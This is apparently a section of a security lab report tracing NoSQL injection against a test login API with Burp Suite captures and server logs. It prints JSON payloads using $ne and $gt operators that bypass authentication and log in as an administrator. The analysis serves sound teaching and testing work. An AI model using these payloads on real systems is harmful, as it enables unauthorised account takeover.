# Trace Analysis

The NoSQL Injection trace was analysed by the use of **Burp Suite request/response captures** with the corresponding **application authentication logs**. This allows the request sent to the vulnerable application to be traced through input processing, database query construction, and the resulting authentication response.

## Normal Authentication Trace - NSQL-01

The normal authentication request was sent to:

```text
POST /api/auth/login
```

with a JSON body containing `username` and `password` as ordinary string values. Burp Suite recorded a successful `HTTP/1.1 200 OK` response.

The corresponding application log recorded:

```text
Input types: username=[string], password=[string]
Executing query: {"username":"alice_admin","password":"..."}
Login successful: alice_admin (Administrator)
POST /api/auth/login HTTP/1.1" 200
```

This is the baseline trace. Both authentication fields were received as strings, the resulting query used ordinary values, and authentication completed successfully.

An incorrect-password test(NSQL-02) produced a `401 Unauthorized` response and a corresponding `Login failed` log entry. This demonstrates that the application is capable of rejecting an ordinary invalid authentication attempt before the NoSQL Injection tests were performed.

## Targeted NoSQL Injection Trace - NSQL-03

The first controlled NoSQL Injection changed the password value from a string into an object containing the `$ne` operator:

```json
{
    "username": "alice_admin",
    "password": {
        "$ne": ""
    }
}
```

The Burp capture showed that the application returned:

```text
HTTP/1.1 200 OK
```

with an authentication-success response.

The corresponding server log at **12:09:36** recorded:

```text
Input types: username=[string], password=[object]
Executing query: {"username":"alice_admin","password":{"$ne":""}}
Login successful: alice_admin (Administrator)
POST /api/auth/login HTTP/1.1" 200
```

The trace shows a clear change from the normal request. The password was no longer interpreted as a string; it was received as an object. The application subsequently incorporated the object containing `$ne` into the database query and returned a successful authentication result.

The matching timestamp and endpoint information connect the Burp request to the server-side log event.

## Full NoSQL Injection Trace - NSQL-04

NoSQL operators in both authentication fields:

```json
{
    "username": {
        "$ne": ""
    },
    "password": {
        "$gt": ""
    }
}
```

Burp Suite recorded:

```text
HTTP/1.1 200 OK
```

and an authentication-success response.

The corresponding application log at **12:10:39** recorded:

```text
Input types: username=[object], password=[object]
Executing query: {"username":{"$ne":""},"password":{"$gt":""}}
Login successful: alice_admin (Administrator)
POST /api/auth/login HTTP/1.1" 200
```

The trace shows evidance of vulnerable behaviour. Unlike the normal request, both authentication fields were received as objects rather than strings. The application then constructed a query containing the supplied `$ne` and `$gt` operators and returned a successful authentication response.

## Trace Comparison

| Trace | Input structure | Query structure | HTTP result | Application result |
|---|---|---|---|---|
| Normal login | string + string | normal values | `200 OK` | Successful authentication |
| Wrong password | string + string | normal values | `401 Unauthorized` | Authentication failed |
| Targeted NoSQL Injection | string + object | `$ne` operator | `200 OK` | Successful authentication |
| Full NoSQL Injection | object + object | `$ne` + `$gt` operators | `200 OK` | Successful authentication |
